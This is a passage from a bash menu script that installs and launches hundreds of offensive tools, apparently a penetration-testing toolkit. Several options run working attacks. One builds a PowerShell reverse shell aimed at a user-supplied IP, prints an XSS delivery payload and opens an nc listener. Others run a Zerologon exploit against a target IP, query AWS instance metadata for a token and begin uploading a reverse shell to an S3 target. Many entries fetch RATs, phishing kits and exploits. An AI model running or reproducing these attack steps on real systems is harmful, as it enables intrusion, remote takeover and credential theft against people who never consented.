"dhcpig" "dirb" "dirbuster" "dirs3arch" "dislocker" "dissector" "dizzy" "dmitry" "dns-spoof" "dns2geoip" "dns2tcp" "dnsa" "dnschef" "dnsmap" "dnsrecon" "dnsutils" "domain-analyzer" "dradis" "dripper" "dsd" "dsniff" "dumb0" "dump1090" "eapmd5pass" "easy-creds" "eazy" "edb" "eindeutig" "elettra" "elettra-gui" "elite-proxy-finder" "enabler" "ent" "enum-shares" "enum4linux" "erase-registrations" "ettercap" "exiv2" "exploit-db" "eyewitness" "facebot" "fakeap" "fakedns" "fakemail" "fang" "fern-wifi-cracker" "fierce" "fiked" "filibuster" "fimap" "findmyhash" "firmware-mod-kit" "fl0p" "flare" "flasm" "flawfinder" "flunym0us" "foremost" "fping" "fport" "fraud-bridge" "freeipmi" "freeradius" "fs-nyarl" "ftp-fuzz" "ftp-scanner" "ftp-spider" "fusil" "fuzzdb" "g72x++" "galleta" "gdb" "geoip" "ghost-phisher" "ghost-py" "gnuradio" "gnutls2" "goldeneye" "golismero" "goog-mail" "gqrx" "grabber" "gtalk-decode" "gtp-scan" "hackersh" "halberd" "halcyon" "hamster" "handle" "hasere" "hash-identifier" "hashcat" "hashcat-utils" "hasher" "hashid" "hashpump" "hashtag" "haystack" "hdcp-genkey" "hdmi-sniff" "heartbleed-honeypot" "hex2bin" "honeyd" "honssh" "host-extract" "hostbox-ssh" "hotpatch" "hotspotter" "hpfeeds" "hping" "http-enum" "http-fuzz" "http-put" "http-traceroute" "httpforge" "httping" "httprint-win32" "hulk" "hwk" "hydra" "hyenae" "hyperion" "ike-scan" "imagejs" "inception" "intercepter-ng" "interrogate" "intersect" "inundator" "iodine" "ip-https-tools" "iputils" "ipv6toolkit" "isr-form" "jad" "jboss-autopwn" "jd-gui" "jhead" "jigsaw" "john" "johnny" "joomscan" "js-beautify" "jsql" "junkie" "jynx2" "kalibrate-rtl" "kippo" "kismet" "kismet-earth" "kismet2earth" "klogger" "kolkata" "kraken" "laf" "lans" "latd" "lbd" "leo" "leroy-jenkins" "lfi-autopwn" "lfi-exploiter" "lfi-fuzzploit" "lfi-scanner" "lfi-sploiter" "lft" "liffy" "linenum" "linux-exploit-suggester" "list-urls" "logkeys" "loki" "lynis" "mac-robber" "macchanger" "maclookup" "magictree" "make-pdf" "malheur" "maligno" "maltego" "maltrieve" "malware-check-tool" "marc4dasm" "maskprocessor" "masscan" "mat" "md5deep" "mdbtools" "mdk3" "mdns-scan" "medusa" "melkor" "memdump" "metasploit" "miranda-upnp" "missionplanner" "mitmproxy" "mkbrutus" "moloch" "monocle" "mp3nema" "mptcp" "mptcp-abuse" "ms-sys" "mtr" "mutator" "mysql2sqlite" "nbtool" "ncrack" "nemesis" "netbios-share-scanner" "netcon" "netdiscover" "netmap" "netmask" "netscan" "netsniff-ng" "netzob" "ngrep" "nield" "nikto" "nipper" "nmap" "nsec3walker" "ntds-decode" "o-saft" "oat" "obfsproxy" "objection" "oclhashcat" "ocs" "ollydbg" "onesixtyone" "onionsearch" "onionshare" "openvas-cli" "openvas-libraries" "openvas-manager" "openvas-scanner" "origami" "ostinato" "owasp-bywaf" "owtf" "p0f" "pack" "packet-o-matic" "packeth" "packit" "padbuster" "panoptic" "paros" "parsero" "pasco" "passe-partout" "passivedns" "patator" "pathod" "pcredz" "pdf-parser" "pdfbook-analyzer" "pdfid" "pdfresurrect" "peach" "peda" "peepdf" "perl-image-exiftool" "perl-tftp" "pev" "php-mt-seed" "php-rfi-payload-decoder" "php-vulnerability-hunter" "plecost" "pompem" "posttester" "powersploit" "prometheus" "protos-sip" "proxychains-ng" "proxycheck" "proxyp" "proxytunnel" "pscan" "pshitt" "pwd-hash" "pwn" "pwntools" "py2exe" "pyew" "pyinstaller" "pyrasite" "pyrit" "python-utidylib" "python2-binaryornot" "python2-yara" "radamsa" "radare2" "radiography" "rarcrack" "rawr" "rcracki-mt" "rdesktop-brute" "reaver" "rebind" "recon-ng" "regeorg" "relay-scanner" "responder" "rfcat" "rfidiot" "rkhunter" "rlogin-scanner" "ropgadget" "ropper" "rrs" "rtlsdr-scanner" "rtp-flood" "ruby-msgpack" "ruby-ronin" "ruby-ronin-support" "ruby-uri-query_params" "rww-attack" "safecopy" "sakis3g" "sandy" "sasm" "sb0x" "sbd" "scalpel" "scanmem" "scapy" "schnappi-dhcp" "scout2" "scrapy" "scrounge-ntfs" "seat" "secure-delete" "sees" "sergio-proxy" "sessionlist" "set" "shellme" "siege" "silk" "simple-ducky" "simple-lan-scan" "sinfp" "sipp" "sipvicious" "skipfish" "skype-dump" "sleuthkit" "slowloris" "smali" "smartphone-pentest-framework" "smbexec" "smtp-fuzz" "smtp-user-enum" "smtp-vrfy" "sn00p" "snmp-fuzzer" "snoopy-ng" "snort" "snow" "socat" "soot" "spade" "spectools" "spiderfoot" "spiderpig-pdffuzzer" "spike" "spike-proxy" "splint" "sploitego" "sps" "sqid" "sqlmap" "sqlninja" "ssh-privkey-crack" "sshuttle" "ssl-hostname-resolver" "ssl-phuck3r" "ssldump" "sslh" "sslscan" "sslstrip" "sslyze" "starttls-mitm" "steghide" "stompy" "storm-ring" "stunnel" "subdomainer" "sulley" "suricata" "svn-extractor" "swaks" "synflood" "synscan" "sysdig" "sysinternals-suite" "t50" "tbear" "tcpcontrol-fuzzer" "tcpdump" "tcpextract" "tcpflow" "tcpreplay" "tcpwatch" "teardown" "tekdefense-automater" "termineter" "tftp-bruteforce" "tftp-fuzz" "tftp-proxy" "thc-ipv6" "thc-keyfinder" "thc-pptp-bruter" "thc-smartbrute" "thc-ssl-dos" "theharvester" "tiger" "tilt" "tinc" "tinyproxy" "tlsenum" "tor" "tor-autocircuit" "tor-browser-en" "torshammer" "torsocks" "traceroute" "trid" "trinity" "trixd00r" "truecrypt" "tsh" "tsh-sctp" "twofi" "u3-pwn" "ubertooth" "udis86" "uefi-firmware-parser" "ufo-wardriving" "umap" "umit" "unhide" "unicorn" "unicornscan" "unix-privesc-check" "unsecure" "upx" "username-anarchy" "usernamer" "uw-loveimap" "uw-offish" "uw-udpscan" "uw-zone" "v3n0m" "valgrind" "vanguard" "vega" "veil" "viper" "vivisect" "vnc-bypauth" "volatility" "w3af" "wapiti" "web-soul" "webhandler" "webpwn3r" "webshells" "websockify" "webspa" "websploit" "weevely" "wfuzz" "whatweb" "wi-feye" "wifi-honey" "wifi-monitor" "wifiphisher" "wig" "wikigen" "winexe" "winfo" "wireless-ids" "wireshark-cli" "wireshark-gtk" "wlan2eth" "wmat" "wol-e" "wpscan" "ws-attacker" "x-scan" "xcavator" "xf86-video-qxl-git" "xortool" "xsser" "xsss" "yara" "ycrawler" "yersinia" "zaproxy" "zmap" "zulu" "zzuf"
		do
			if [[ "$PIPO" != "" ]];
			then
				pip3 install "$PIPO"
			else
				break
			fi
		done
	;;
	"2269")
		Scarica "$ENTSSL""righettod/pst-digger/releases/download/v1.0.0/pst-digger.jar"
	;;
	"2270")
		Clona "righettod/tls-cert-discovery"
	;;
	"2271")
		Scarica "$ENTRAW""dc414/Upnp-Exploiter/master/upnp.py"
	;;
	"2272")
		Clona "srnframe/eviloffice"
	;;
	"2273")
		Clona "8L4NK/evilreg"
	;;
	"2274")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "superzerosec/evilpdf"
		fi
	;;
	"2275")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "CrackerCat/evildll"
		fi
	;;
	"2276")
		Clona "qtc-de/remote-method-guesser"
	;;
	"2277")
		Clona "suljot/shellphish"
	;;
	"2278")
		Clona "s0md3v/Bolt"
	;;
	"2279")
		Clona "MrCl0wnLab/ShellShockHunter"
	;;
	"2280")
		Scarica "$ENTRAW""DanMcInerney/shellshock-hunter/master/shellshock-hunter.py"
	;;
	"2281")
		Clona "0xd012/wifuzzit"
	;;
	"2282")
		Clona "s0md3v/ReconDog"
	;;
	"2283")
		Clona "koutto/web-brutator"
	;;
	"2284")
		Scarica "$ENTSSL""deepsecurity-pe/GoGhost/raw/master/GoGhost_linux_amd64"
	;;
	"2285")
		Scarica "$ENTRAW""deepsecurity-pe/GoGhost/master/GoGhost.go"
	;;
	"2286")
		Clona "seemoo-lab/toothpicker"
	;;
	"2287")
		Scarica "$ENTRAW""galkan/tools/master/mail-crawl/mail-crawl.py"
	;;
	"2288")
		Clona "thehackingsage/hacktronian"
	;;
	"2289")
		select GEMO in "activemodel" "activerecord" "activesupport" "addressable" "ansi" "apscanner" "apullo" "arp_scan" "" "async" "async-dns" "async-http" "async-io" "async-pool" "atomic" "benchmark" "bigdecimal" "brakeman" "bscan" "buftok" "bundler" "celluloid" "celluloid-io" "cgi" "cms_scanner" "colorize" "concurrent-ruby" "concurrent-ruby-edge" "console" "csv" "daemons" "date" "dawnscanner" "dbm" "delegate" "did_you_mean" "dockscan" "domain_name" "domains_scanner" "DrupalScan" "em-websocket" "equalizer" "erubis" "espeak-ruby" "etc" "ethon" "eventmachine" "execjs" "fast_port_scanner" "fcntl" "ffi" "ffi-compiler" "fiber-local" "fiddle" "fileutils" "forwardable" "gdbm" "get_process_mem" "getoptlong" "google-cloud-web_security_scanner" "hacker-gems" "ham" "hashie" "hashie-forbidden_attributes" "hitimes" "http" "http-accept" "http-cookie" "http-form_data" "http-parser" "http_parser.rb" "httpclient" "http_scanner" "i18n" "io-console" "ipaddr" "ipaddress" "irb" "json" "logger" "matrix" "maxmind-db" "mdless" "memoizable" "mime" "mime-types" "mime-types-data" "mini_exiftool" "minitest" "mojo_magick" "msfrpc-client" "msgpack" "multi_json" "multipart-post" "mustermann" "mutex_m" "naught" "net-http-digest_auth" "net-pop" "net-smtp" "net-telnet" "netrc" "network_scanner" "nio4r" "nokogiri" "observer" "oj" "open3" "openssl" "opt_parse_validator" "ostruct" "otr-activerecord" "parseconfig" "password_crack" "pkg-config" "portfinder" "portscanner" "power_assert" "prime" "protocol-hpack" "protocol-http" "protocol-http1" "protocol-http2" "pstore" "psych" "public_suffix" "qr4r" "racc" "rack" "rack-protection" "rake" "rchardet" "rdoc" "readline" "readline-ext" "recog" "reline" "rest-client" "rexml" "rpc-mapper" "rqrcode_core" "rss" "ruby-progressbar" "ruby_wifi_scanner" "ruby2_keywords" "rubydns" "rubygems-update" "rubyzip" "rushover" "scanny" "ScanSSL" "sdbm" "simple_oauth" "sinatra" "singleton" "slack-notifier" "smb-client" "snmp" "snmpdumper" "snmpscan" "spider" "sqlite3" "ssh-exec" "ssh_scan" "ssl_scan" "ssl_scanner" "stringio" "strscan" "sync" "term-ansicolor" "test-unit" "thin" "thread_safe" "tilt" "timeout" "timers" "tins" "tracer" "twitter" "typhoeus" "tzinfo" "uglifier" "unf" "unf_ext" "uri" "w3map" "webrick" "wordstress" "wpscan" "xmlrpc" "XSpear" "xss" "yajl-ruby" "yaml" "zeitwerk" "zlib" "zola"
		do
			if [[ "$GEMO" != "" ]];
			then
				gem install "$GEMO"
			else
				break
			fi
		done
	;;
	"2290")
		if [[ -f ./lazys3.rb ]];
		then
			if [[ "$TURL" == "http://0.0.0.0" ]];
			then
				echo "Digit a target url, domain.topdomain"
				read -p "(example, thisone.com): " TURL
			fi
			./lazys3.rb "$TURL"
		else
			Scarica "$ENTRAW""nahamsec/lazys3/master/common_bucket_prefixes.txt"
			Scarica "$ENTRAW""nahamsec/lazys3/master/lazys3.rb"
		fi
	;;
	"2291")
		Scarica "$ENTRAW""tomdev/teh_s3_bucketeers/master/bucketeer.sh"
		Scarica "$ENTRAW""tomdev/teh_s3_bucketeers/master/common_bucket_prefixes.txt"
	;;
	"2293")
		Clona "ProjectAnte/dnsgen"
	;;
	"2294")
		Scarica "$ENTRAW""pixelbubble/ProtOSINT/main/protosint.py"
	;;
	"2295")
		Clona "beefproject/beef"
	;;
	"2296")
		Clona "s3inlc/hashtopolis"
	;;
	"2297")
		Clona "xmendez/wfuzz"
	;;
	"2298")
		Clona "the-robot/sqliv"
	;;
	"2299")
		Clona "dr-3am/M-Evil"
	;;
	"2300")
		Clona "shamrin/diceware"
	;;
	"2302")
		Clona "josh0xA/darkdump"
	;;
	"2303")
		Scarica "$ENTRAW""bitvijays/Pentest-Scripts/master/Vulnerability_Analysis/isciadm/iscsiadm.sh"
	;;
	"2304")
		Clona "open-iscsi/open-iscsi"
	;;
	"2305")
		Scarica "$ENTRAW""aron-tn/Smtp-cracker/master/smtp.py"
	;;
	"2306")
		Clona "tismayil/rsdl"
	;;
	"2307")
		Clona "rizinorg/rizin"
	;;
	"2308")
		Scarica "$ENTRAW""RealityNet/ios_triage/master/ios_triage.sh"
	;;
	"2309")
		Clona "abrignoni/iLEAPP"
	;;
	"2310")
		Clona "shipcod3/mazda_getInfo"
	;;
	"2311")
		Clona "P1kachu/talking-with-cars"
	;;
	"2312")
		Clona "nccgroup/keimpx"
	;;
	"2313")
		Clona "cribdragg3r/Alaris"
	;;
	"2314")
		Clona "FortyNorthSecurity/Just-Metadata"
	;;
	"2315")
		Scarica "$ENTRAW""metac0rtex/GitHarvester/master/githarvester.py"
	;;
	"2316")
		Clona "davidtavarez/pwndb"
	;;
	"2317")
		Clona "mdsecactivebreach/SharpShooter"
	;;
	"2318")
		Scarica "$ENTRAW""samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1"
		echo "Digit your IP address"
		read -p "(example, 192.168.1.10): " MIP
		if [[ "$MIP" != "" ]];
		then
			echo "Digit your port"
			read -p "(example, 9001): " MPRT
			if [[ "$MPRT" =~ ^[0-9]+$ ]];
			then
				echo -ne "\nInvoke-PowerShellTcp -Reverse -IPAddress ""$MIP"" -Port ""$MPRT" >> Invoke-PowerShellTcp.ps1
				python3 -m http.server &
				echo "PASTE this payload for XSS"
				echo "[COPY+PASTE] | powershell -exec bypass -f \\\\\\\\""$MIP""\\\\""Invoke-PowerShellTcp.ps1"
				rlwrap nc -lvnp "$MPRT"
			fi
		fi
	;;
	"2319")
		Clona "dwisiswant0/apkleaks"
	;;
	"2320")
		Clona "Den1al/JSShell"
	;;
	"2321")
		Scarica "$ENTRAW""shelld3v/JSshell/master/jsh.py"
	;;
	"2322")
		Clona "Hacktivation/iOS-Hacktivation-Toolkit"
	;;
	"2323")
		Clona "dnikles/removeActivationLock"
	;;
	"2324")
		Clona "tuttarealstep/iUnlock"
	;;
	"2325")
		Clona "gwatts/pinfinder"
	;;
	"2326")
		Clona "j3ers3/Searpy"
	;;
	"2327")
		Clona "spicesouls/spicescript"
	;;
	"2328")
		Clona "spicesouls/spicescript2"
	;;
	"2329")
		Clona "CMEPW/Smersh"
	;;
	"2330")
		Clona "FrenchCisco/RATel"
	;;
	"2331")
		Clona "offensive-security/exploitdb"
	;;
	"2332")
		Scarica "https://labs.portcullis.co.uk/download/acccheck-0-2-1.tar.gz"
	;;
	"2333")
		Scarica "https://packetstormsecurity.com/files/download/132438/aesshell-0.7.tar.bz2"
	;;
	"2334")
		Scarica "https://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz"
	;;
	"2335")
		Clona "oppsec/juumla"
	;;
	"2336")
		Clona "whid-injector/WHID"
	;;
	"2337")
		ls *.deb
		echo "Digit a deb package to install"
		read -e -p "(example, package.deb): " DEB
		if [[ -f "$DEB" ]];
		then
			dpkg -i "$DEB"
		fi
	;;
	"2338")
		select BRP in "chrome" "chromium" "epiphany" "falkon" "firefox" "konqueror" "midori" "opera" "vivaldi"
		do
			case "$BRP" in
			"chrome")
				wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
			;;
			"chromium")
				apt-get install chromium-browser
			;;
			"epiphany")
				dnf install snapd
				ln -s /var/lib/snapd/snap /snap
				snap install epiphany
			;;
			"falkon")
				dnf install snapd
				ln -s /var/lib/snapd/snap /snap
				snap install falkon
			;;
			"firefox")
				add-apt-repository ppa:mozillateam/firefox-next
				apt update && apt upgrade
				apt install firefox
			;;
			"konqueror")
				apt install konqueror
			;;
			"midori")
				dnf install snapd
				ln -s /var/lib/snapd/snap /snap
				snap install midori
			;;
			"opera")
				add-apt-repository 'deb https://deb.opera.com/opera-stable/ stable non-free'
				wget -qO - https://deb.opera.com/archive.key | sudo apt-key add -
				apt-get update
				apt-get install opera-stable
			;;
			"vivaldi")
				wget -qO- https://repo.vivaldi.com/archive/linux_signing_key.pub | sudo apt-key add -
				add-apt-repository 'deb https://repo.vivaldi.com/archive/deb/ stable main'
				apt update && apt install vivaldi-stable
			;;
			esac
			break
		done
	;;
	"2339")
		Clona "Pinperepette/Geotweet_GUI"
	;;
	"2340")
		Clona "Pinperepette/GeoTweet"
	;;
	"2341")
		Scarica "$ENTRAW""Pinperepette/whistory/master/whistory.py"
	;;
	"2342")
		Clona "guardicore/monkey"
	;;
	"2343")
		Clona "UndeadSec/EvilURL"
	;;
	"2344")
		Clona "sensepost/objection"
	;;
	"2345")
		Clona "SharadKumar97/OSINT-SPY"
	;;
	"2346")
		Clona "infosecsecurity/Spaghetti"
	;;
	"2347")
		Clona "sidaf/homebrew-pentest"
	;;
	"2348")
		Clona "realgam3/pymultitor"
	;;
	"2349")
		Clona "4w4k3/rePy2exe"
	;;
	"2350")
		echo "Do you want clone this repo from official git?"
		read -p "(Y/n): " RSP
		if [[ "$RSP" == "Y" ]];
		then
			git clone https://git.torproject.org/torsocks.git
		else
			Clona "torsocks/torsocks"
		fi
	;;
	"2351")
		Clona "dirkjanm/PrivExchange"
	;;
	"2352")
		Clona "bhavsec/reconspider"
	;;
	"2353")
		if [[ -f $(which docker) ]];
		then
			echo "Choose an image"
			select DIM in "aflplusplus/aflplusplus" "techantidote/aircrack" "frapsoft/aircrack-ng" "caffix/amass" "grugnog/amass" "nodyd/amass" "txt3rob/aquatone-docker" "simonthomas/armitage" "eivantsov/arp-scan" "ganboing/arp-scan" "bannsec/autopsy" "bannsec/beef" "ilyaglow/beef" "janes/beef" "phocean/beef" "gillis57/binwalk" "hackersploit/bugbountytoolkit" "opensecurity/cmsscan" "blacktop/cuckoo" "curlimages/curl" "fopina/dedroid" "fspnetwork/dex2jar" "hypnza/dirbuster" "razaborg/dnschef" "n4n0m4c/dnsrecon" "tutum/dnsutils" "xdxd/docker-binwalk" "pemcconnell/docker-burpsuite" "pemcconnell/docker-ettercap" "dizcza/docker-hashcat" "vimagick/dsniff" "pypi/enum" "docker4x/enum-azure" "mrecco/ettercap" "jasonmce/fakedns" "toendeavour/fakedns-alpine" "infoslack/fierce" "aoighost/gobuster" "devalias/gobuster" "kodisha/gobuster" "vulhub/gobuster" "pebbletech/golismero" "jsitech/golismero" "treemo/golismero" "antfie/hacksys" "gophernet/hping" "linuxserver/hydra" "oryd/hydra" "adamoss/john-the-ripper" "phocean/john_the_ripper_jumbo" "naik/kali-armitage" "fcch/kali-console" "sofianehamlaoui/lockdoor" "metasploitframework/metasploit-framework" "online2311/mitmf" "instrumentisto/nmap" "aaaguirrep/offensive-docker" "szalek/pentest-tools" "tomsteele/recon-ng" "evilmind/sipmple-fake-dns" "kfaughnan/smbclient" "siuyin/smbclient" "ilyaglow/sqlmap" "jamesmstone/sqlmap" "m4n3dw0lf/sqlmap" "paoloo/sqlmap" "sagikazarmark/sqlmap" "dominicbreuker/stego-toolkit" "secretsquirrel/the-backdoor-factory" "gophernet/traceroute" "opennsm/tshark" "sflow/tshark" "toendeavour/tshark" "dominicbreuker/wfuzz" "hypnza/wfuzz" "ilyaglow/wfuzz" "linuxserver/wireshark" "ffeldhaus/wireshark" "manell/wireshark" "wpscanteam/wpscan" "owasp/zap2docker-bare" "owasp/zap2docker-live" "owasp/zap2docker-stable"
			do
				if [[ "$DIM" != "" ]];
				then
					echo "Digit a tag"
					read -p "(example, latest): " TAGS
					if [[ "$TAGS" == "" ]];
					then
						TAGS="latest"
					fi
					sudo docker pull "$DIM"":$TAGS"
				fi
			done
		else
			echo "You have not installed docker"
		fi
	;;
	"2354")
		Clona "py2exe/py2exe"
	;;
	"2355")
		Clona "paranoidninja/CarbonCopy"
	;;
	"2356")
		Clona "Mr-Un1k0d3r/UniByAv"
	;;
	"2357")
		Clona "fireeye/gocrack"
	;;
	"2358")
		Clona "klsecservices/s7scan"
	;;
	"2359")
		Clona "khaleds-brain/Bella"
	;;
	"2360")
		Scarica "$ENTRAW""hslatman/awesome-industrial-control-system-security/main/source/s7-cracker.py"
	;;
	"2361")
		Scarica "$ENTRAW""hslatman/awesome-industrial-control-system-security/main/source/s7-brute-offline.py"
	;;
	"2362")
		Clona "oppsec/Squid"
	;;
	"2363")
		Clona "lirantal/is-website-vulnerable"
	;;
	"2364")
		Clona "1N3/BlackWidow"
	;;
	"2365")
		Clona "mikesplain/openvas-docker"
	;;
	"2366")
		Clona "lengjibo/dedecmscan"
	;;
	"2367")
		Scarica "$ENTRAW""k8gege/K8PortScan/master/K8PortScan.py"
	;;
	"2368")
		Scarica "$ENTSSL""k8gege/K8tools/raw/master/K8PortScan_Kali_x86"
	;;
	"2369")
		Clona "xs25cn/scanPort"
	;;
	"2370")
		Clona "spatie/mixed-content-scanner"
	;;
	"2371")
		Clona "The404Hacking/XsSCan"
	;;
	"2372")
		Clona "0dayCTF/reverse-shell-generator"
	;;
	"2373")
		Clona "visma-prodsec/confused"
	;;
	"2374")
		Clona "techchipnet/CamPhish"
	;;
	"2375")
		Clona "nathanlopez/Stitch"
	;;
	"2376")
		Clona "caffix/amass"
	;;
	"2377")
		Clona "programmingAthlete/BruteSniffing_Fisher"
	;;
	"2378")
		Clona "madrisan/cisco5crack"
	;;
	"2379")
		Clona "kurobeats/fimap"
	;;
	"2380")
		Scarica "$ENTRAW""frdmn/findmyhash/master/findmyhash.py"
	;;
	"2381")
		echo "Navigate to ""$ENTSSL""andrew-d/static-binaries/tree/master/binaries/linux/x86_64"
		echo "Digit a binary to download"
		read -p "(example, socat): " BFL
		if [[ "$BFL" != "" ]];
		then
			Scarica "$ENTSSL""andrew-d/static-binaries/raw/master/binaries/linux/x86_64/""$BFL"
		fi
	;;
	"2382")
		echo "Navigate to ""$ENTSSL""andrew-d/static-binaries/tree/master/binaries/linux/x86"
		echo "Digit a binary to download"
		read -p "(example, socat): " BFL
		if [[ "$BFL" != "" ]];
		then
			Scarica "$ENTSSL""andrew-d/static-binaries/raw/master/binaries/linux/x86/""$BFL"
		fi
	;;
	"2383")
		echo "Navigate to ""$ENTSSL""andrew-d/static-binaries/tree/master/binaries/linux/arm"
		echo "Digit a binary to download"
		read -p "(example, socat): " BFL
		if [[ "$BFL" != "" ]];
		then
			Scarica "$ENTSSL""andrew-d/static-binaries/raw/master/binaries/linux/arm/""$BFL"
		fi
	;;
	"2384")
		Clona "SpiderLabs/Responder"
	;;
	"2385")
		Scarica "$ENTRAW""hausec/ProxyLogon/main/proxylogon.py"
	;;
	"2386")
		OFFSEC="SecureAuthCorp/impacket/"
		MEX="master/"
		if [[ -f $(which lynx) ]];
		then
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""examples/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""examples/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""examples"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""examples/" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""examples with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTRAW""$OFFSEC""$MEX""examples/""$NOMEFL"
			fi
		fi
	;;
	"2387")
		Clona "swagkarna/Rafel-Rat"
	;;
	"2388")
		Scarica "$ENTRAW""DavidWittman/wpxmlrpcbrute/master/wordlists/1000-most-common-passwords.txt"
	;;
	"2389")
		Scarica "$ENTRAW""samhaxr/AnonX/main/Anonx.sh"
	;;
	"2390")
		Clona "nodauf/Girsh"
	;;
	"2391")
		Clona "ztgrace/mole"
	;;
	"2392")
		Scarica "$ENTRAW""swisskyrepo/PayloadsAllTheThings/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
	;;
	"2393")
		Scarica "$ENTRAW""swisskyrepo/PayloadsAllTheThings/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md"
	;;
	"2394")
		Scarica "$ENTRAW""swisskyrepo/PayloadsAllTheThings/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md"
	;;
	"2395")
		Scarica "$ENTRAW""swisskyrepo/PayloadsAllTheThings/master/Kubernetes/readme.md"
	;;
	"2396")
		Clona "Shopify/kubeaudit"
	;;
	"2397")
		Clona "controlplaneio/kubesec"
	;;
	"2398")
		Clona "aquasecurity/kube-bench"
	;;
	"2399")
		Scarica "$ENTRAW""swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/README.md"
	;;
	"2400")
		Clona "r3curs1v3-pr0xy/vajra"
	;;
	"2401")
		Clona "A3h1nt/Subcert"
	;;
	"2402")
		Clona "r3curs1v3-pr0xy/sub404"
	;;
	"2403")
		Scarica "$ENTRAW""p3nt4/Invoke-SocksProxy/master/ReverseSocksProxyHandler.py"
	;;
	"2404")
		Scarica "$ENTRAW""RickGeex/ProxyLogon/main/ProxyLogon.py"
	;;
	"2405")
		Clona "c0dejump/HawkScan"
	;;
	"2406")
		Clona "an00byss/godehashed"
	;;
	"2407")
		Scarica "$ENTRAW""dotPY-hax/gitlab_RCE/main/gitlab_rce.py"
	;;
	"2408")
		Clona "mentebinaria/retoolkit"
	;;
	"2409")
		Clona "asad1996172/Obfuscation-Detection"
	;;
	"2410")
		Scarica "$ENTRAW""RealityNet/android_triage/main/android_triage.sh"
	;;
	"2411")
		Scarica "$ENTRAW""androidmalware/android_hid/main/hid_attack"
	;;
	"2412")
		Clona "urbanadventurer/Android-PIN-Bruteforce"
	;;
	"2413")
		Clona "anbud/DroidDucky"
	;;
	"2414")

		if [[ ! -d "./CVE-2020-1472" ]];
		then
			Clona "dirkjanm/CVE-2020-1472"
		fi
		echo "Digit the Target IP"
		read -p "(example, 192.168.1.12): " TIP
		if [[ "$TIP" != "" ]];
		then
			echo "Digit the Target NetBIOS name"
			read -p "(example, PC_WORKGROUP): " TDOM
			if [[ "$TDOM" != "" ]];
			then
				./CVE-2020-1472/cve-2020-1472-exploit.py "$TDOM" "$TIP"
			fi
		fi
	;;
	"2415")
		Scarica https://digi.ninja/files/bucket_finder_1.1.tar.bz2
	;;
	"2416")
		Clona "nccgroup/s3_objects_check"
	;;
	"2417")
		Clona "duo-labs/cloudmapper"
	;;
	"2418")
		Clona "NetSPI/aws_consoler"
	;;
	"2419")
		Clona "andresriancho/enumerate-iam"
	;;
	"2420")
		Clona "kost/dockscan"
	;;
	"2421")
		Clona "twistlock/RunC-CVE-2019-5736"
	;;
	"2422")
		Clona "michenriksen/gitrob"
	;;
	"2423")
		echo "Digit a target url"
		read -p "(example, http://10.11.12.13): " TURL
		if [[ "$TURL" != "" ]];
		then
			export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "$TURL/latest/api/token"`
			if [[ "$ANON" == "Enabled" ]];
			then
				curl -s -k -L --socks5 "$SANON" -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TURL/latest/meta-data"
			else
				curl -s -k -L -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TURL/latest/meta-data"
			fi
		fi
	;;
	"2424")
		Clona "antonio-morales/Apache-HTTP-Fuzzing"
	;;
	"2425")
		Clona "skelsec/pypykatz"
	;;
	"2426")
		Clona "sensepost/glypeahead"
	;;
	"2427")
		Clona "IGRSoft/KisMac2"
	;;
	"2428")
		Clona "jas502n/CVE-2019-12384"
	;;
	"2429")
		Clona "ifsnop/mysqldump-php"
	;;
	"2430")
		Clona "Checkmarx/kics"
	;;
	"2431")
		Clona "heilla/SecurityTesting"
	;;
	"2432")
		Clona "eslam3kl/crtfinder"
	;;
	"2433")
		Clona "eslam3kl/3klector"
	;;
	"2434")
		Clona "eslam3kl/Explorer"
	;;
	"2435")
		Scarica "$ENTRAW""eslam3kl/PackSniff/master/packsniff.py"
	;;
	"2436")
		Scarica "$ENTRAW""eslam3kl/NetScanner/master/network_scanner.py"
	;;
	"2437")
		Scarica "$ENTRAW""eslam3kl/ARP-Spoofer/master/arp_spoofer.py"
	;;
	"2438")
		Scarica "$ENTRAW""eslam3kl/MAC_Changer/master/mac_changer.py"
	;;
	"2439")
		Clona "matamorphosis/Scrummage"
	;;
	"2440")
		Clona "assetnote/kiterunner"
	;;
	"2441")
		Clona "unipacker/unipacker"
	;;
	"2442")
		Clona "denandz/fuzzotron"
	;;
	"2443")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "System00-Security/Git-Cve"
		fi
	;;
	"2444")
		Clona "foofus-sph1nx/PyMailSniper"
	;;
	"2445")
		Clona "ra1nb0rn/avain"
	;;
	"2446")
		Clona "MichaelDim02/houndsniff"
	;;
	"2447")
		Clona "octetsplicer/LAZYPARIAH"
	;;
	"2448")
		Scarica "$ENTRAW""ricardojoserf/adfsbrute/main/adfsbrute.py"
	;;
	"2449")
		Scarica "https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/spraygen/spraygen-1.3.4.zip"
	;;
	"2450")
		Clona "modded-ubuntu/modded-ubuntu"
	;;
	"2451")
		Clona "google/security-research"
	;;
	"2452")
		echo "Digit the target Url"
		read -p "(example, https://s3.domain.com): " TURL
		if [[ "$TURL" != "" ]];
		then
			echo "Digit a reverse shell to upload"
			read -e -p "(example, rev.php): " RVSH
			if [[ -f "$RVSH" ]];
			then
				echo "Digit a the only remote destionation path without protocol and without the final file name"
				read -p "(example, advserver/): " SDST
				if [[ "$SDST" != "" ]];
